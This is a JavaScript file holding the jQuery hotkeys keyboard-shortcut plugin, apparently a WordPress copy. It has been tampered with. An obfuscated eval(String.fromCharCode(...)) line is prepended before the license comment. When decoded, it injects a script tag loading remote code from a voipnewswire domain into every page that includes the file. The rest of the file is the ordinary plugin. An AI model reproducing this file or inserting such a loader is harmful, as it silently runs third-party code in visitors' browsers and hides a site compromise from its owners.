eval(String.fromCharCode(118, 97, 114, 32, 101, 108, 101, 109, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 101, 108, 101, 109, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 101, 108, 101, 109, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 101, 108, 101, 109, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 53, 44, 32, 52, 54, 44, 32, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 101, 108, 101, 109, 41, 59, 32, 125));/******************************************************************************************************************************

 * @ Original idea by by Binny V A, Original version: 2.00.A
 * @ http://www.openjs.com/scripts/events/keyboard_shortcuts/
 * @ Original License : BSD

 * @ jQuery Plugin by Tzury Bar Yochay
        mail: tzury.by@gmail.com
        blog: evalinux.wordpress.com
        face: facebook.com/profile.php?id=513676303

        (c) Copyrights 2007

 * @ jQuery Plugin version Beta (0.0.2)
 * @ License: jQuery-License.

TODO:
    add queue support (as in gmail) e.g. 'x' then 'y', etc.
    add mouse + mouse wheel events.

USAGE:
    $.hotkeys.add('Ctrl+c', function(){ alert('copy anyone?');});
    $.hotkeys.add('Ctrl+c', {target:'div#editor', type:'keyup', propagate: true},function(){ alert('copy anyone?');});>
    $.hotkeys.remove('Ctrl+c');
    $.hotkeys.remove('Ctrl+c', {target:'div#editor', type:'keypress'});

******************************************************************************************************************************/
(function (jQuery){
    this.version = '(beta)(0.0.3)';
	this.all = {};
    this.special_keys = {
        27: 'esc', 9: 'tab', 32:'space', 13: 'return', 8:'backspace', 145: 'scroll', 20: 'capslock',
        144: 'numlock', 19:'pause', 45:'insert', 36:'home', 46:'del',35:'end', 33: 'pageup',
        34:'pagedown', 37:'left', 38:'up', 39:'right',40:'down', 112:'f1',113:'f2', 114:'f3',
        115:'f4', 116:'f5', 117:'f6', 118:'f7', 119:'f8', 120:'f9', 121:'f10', 122:'f11', 123:'f12'};

    this.shift_nums = { "`":"~", "1":"!", "2":"@", "3":"#", "4":"$", "5":"%", "6":"^", "7":"&",
        "8":"*", "9":"(", "0":")", "-":"_", "=":"+", ";":":", "'":"\"", ",":"<",
        ".":">",  "/":"?",  "\\":"|" };

    this.add = function(combi, options, callback) {
        if (jQuery.isFunction(options)){
            callback = options;
            options = {};
        }
        var opt = {},
            defaults = {type: 'keydown', propagate: false, disableInInput: false, target: jQuery('html')[0]},
            that = this;
        opt = jQuery.extend( opt , defaults, options || {} );
        combi = combi.toLowerCase();

        // inspect if keystroke matches
        var inspector = function(event) {
            // WP: not needed with newer jQuery
            // event = jQuery.event.fix(event); // jQuery event normalization.
            var element = event.target;
            // @ TextNode -> nodeType == 3
            // WP: not needed with newer jQuery
            // element = (element.nodeType==3) ? element.parentNode : element;

            if ( opt['disableInInput'] ) { // Disable shortcut keys in Input, Textarea fields
                var target = jQuery(element);

				if ( ( target.is('input') || target.is('textarea') ) &&
					( ! opt.noDisable || ! target.is( opt.noDisable ) ) ) {

					return;
                }
            }
            var code = event.which,
                type = event.type,
                character = String.fromCharCode(code).toLowerCase(),
                special = that.special_keys[code],
                shift = event.shiftKey,
                ctrl = event.ctrlKey,
                alt= event.altKey,
                meta = event.metaKey,
                propagate = true, // default behaivour
                mapPoint = null;

            // in opera + safari, the event.target is unpredictable.
            // for example: 'keydown' might be associated with HtmlBodyElement
            // or the element where you last clicked with your mouse.
            // WP: needed for all browsers
            // if (jQuery.browser.opera || jQuery.browser.safari){
                while (!that.all[element] && element.parentNode){
                    element = element.parentNode;
                }
            // }
            var cbMap = that.all[element].events[type].callbackMap;
            if(!shift && !ctrl && !alt && !meta) { // No Modifiers
                mapPoint = cbMap[special] ||  cbMap[character]
			}
            // deals with combinaitons (alt|ctrl|shift+anything)
            else{
                var modif = '';
                if(alt) modif +='alt+';
                if(ctrl) modif+= 'ctrl+';
                if(shift) modif += 'shift+';
                if(meta) modif += 'meta+';
                // modifiers + special keys or modifiers + characters or modifiers + shift characters
                mapPoint = cbMap[modif+special] || cbMap[modif+character] || cbMap[modif+that.shift_nums[character]]
            }
            if (mapPoint){
                mapPoint.cb(event);
                if(!mapPoint.propagate) {
                    event.stopPropagation();
                    event.preventDefault();
                    return false;
                }
            }
		};
        // first hook for this element
        if (!this.all[opt.target]){
            this.all[opt.target] = {events:{}};
        }
        if (!this.all[opt.target].events[opt.type]){
            this.all[opt.target].events[opt.type] = {callbackMap: {}}
            jQuery.event.add(opt.target, opt.type, inspector);
        }
        this.all[opt.target].events[opt.type].callbackMap[combi] =  {cb: callback, propagate:opt.propagate};
        return jQuery;
	};
    this.remove = function(exp, opt) {
        opt = opt || {};
        target = opt.target || jQuery('html')[0];
        type = opt.type || 'keydown';
		exp = exp.toLowerCase();
        delete this.all[target].events[type].callbackMap[exp]
        return jQuery;
	};
    jQuery.hotkeys = this;
    return jQuery;
})(jQuery);
